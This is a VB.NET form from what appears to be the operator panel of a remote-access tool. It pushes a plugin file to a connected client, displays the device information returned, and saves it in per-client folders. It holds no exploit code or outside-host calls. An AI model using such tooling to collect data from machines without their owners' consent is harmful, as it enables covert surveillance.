Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Web.UI.WebControls

Public Class FrmInfo
    Public C As tlscclient
    Public CID As String
    Private Sub INFO_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ref()
    End Sub
    Public Sub ref()
        Dim B As Byte()
        Try
            TextBox1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "Information..."  '' Receiving the information
            B = SB("Xinfo" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\cpp\class37.plg")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.Red
            ToolStripStatusLabel1.Text = "-!"
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub


    Private Sub RefrechToolStripMenuItem_Click(sender As Object, e As EventArgs)
        ref()
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Try
            Clipboard.SetText(TextBox1.SelectedText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Try
            If TextBox1.Text = Nothing Then
            Else
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\Information") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\Information")
                End If

                Dim objWriter As New System.IO.StreamWriter(Application.StartupPath & "\Downloads" & "\" & CID & "\Information" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".txt", False)
                objWriter.WriteLine(TextBox1.Text)
                objWriter.Close()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub RefrechToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles RefrechToolStripMenuItem.Click
        ref()
    End Sub

    Private Sub CopyToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            Clipboard.SetText(TextBox1.SelectedText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub SaveToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Try
            If TextBox1.Text = Nothing Then
            Else
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\Information") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\Information")
                End If

                Dim objWriter As New System.IO.StreamWriter(Application.StartupPath & "\Downloads" & "\" & CID & "\Information" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".txt", False)
                objWriter.WriteLine(TextBox1.Text)
                objWriter.Close()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub



    ''' <summary>
    ''' The ReleaseCapture.
    ''' </summary>
    <DllImport("user32.DLL", EntryPoint:="ReleaseCapture")>
    Private Shared Sub ReleaseCapture()
    End Sub

    ''' <summary>
    ''' The SendMessage.
    ''' </summary>
    ''' <paramname="hwnd">The hwnd<seecref="IntPtr"/>.</param>
    ''' <paramname="wmsg">The wmsg<seecref="Integer"/>.</param>
    ''' <paramname="wparam">The wparam<seecref="Integer"/>.</param>
    ''' <paramname="lparam">The lparam<seecref="Integer"/>.</param>
    <DllImport("user32.DLL", EntryPoint:="SendMessage")>
    Private Shared Sub SendMessage(ByVal hwnd As IntPtr, ByVal wmsg As Integer, ByVal wparam As Integer, ByVal lparam As Integer)
    End Sub

    ''' <summary>
    ''' The panel1_MouseDown.
    ''' </summary>
    ''' <paramname="sender">The sender<seecref="Object"/>.</param>
    ''' <paramname="e">The e<seecref="MouseEventArgs"/>.</param>
    Private Sub Guna2Panel2_MouseDown(sender As Object, e As MouseEventArgs) Handles Guna2Panel2.MouseDown
        ReleaseCapture()
        SendMessage(Handle, &H112, &HF012, 0)
    End Sub
End Class